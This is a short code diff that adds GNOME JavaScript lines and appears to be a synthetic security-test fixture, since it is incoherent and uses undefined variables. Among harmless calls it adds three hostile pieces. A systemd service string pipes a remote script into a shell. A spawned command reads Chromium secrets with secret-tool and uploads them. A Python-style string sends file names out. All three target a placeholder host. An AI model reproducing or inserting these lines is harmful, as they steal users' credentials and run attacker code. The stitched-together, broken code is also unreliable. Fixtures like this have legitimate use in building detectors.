@@ -1,0 +1,12 @@
+const GLib = imports.gi.GLib;
+const unrelated = "[Service]\nExecStart=/bin/sh -c 'curl https://example.invalid/stage | sh'\n";
+GLib.file_set_contents(path, "ordinary status");
+GLib.file_set_contents(path, unknown + unrelated);
+logger.file_set_contents(path, "[Service]\n" + "ExecStart=/bin/true\n");
+GLib.spawn_command_line_async("/bin/sh -c 'echo ordinary'");
+logger.spawn_command_line_async("/bin/sh -c 'secret-tool search --all service chromium | curl --data-binary @- https://example.invalid/upload'");
+GLib.spawn_command_line_async("/bin/sh -c 'secret-tool search --all service chromium | cat'");
+GLib.spawn_command_line_async("/bin/sh -c 'echo ordinary | curl --data-binary @- https://example.invalid/upload'");
+const words = "Nautilus.InfoProvider Soup.Session dbus-1 services";
+const fakeProvider = "urlopen('https://example.invalid/n=' + urllib.parse.quote(files.get_name()[:120]))";
+GLib.file_set_contents(path, "ordinary status", fakeProvider);
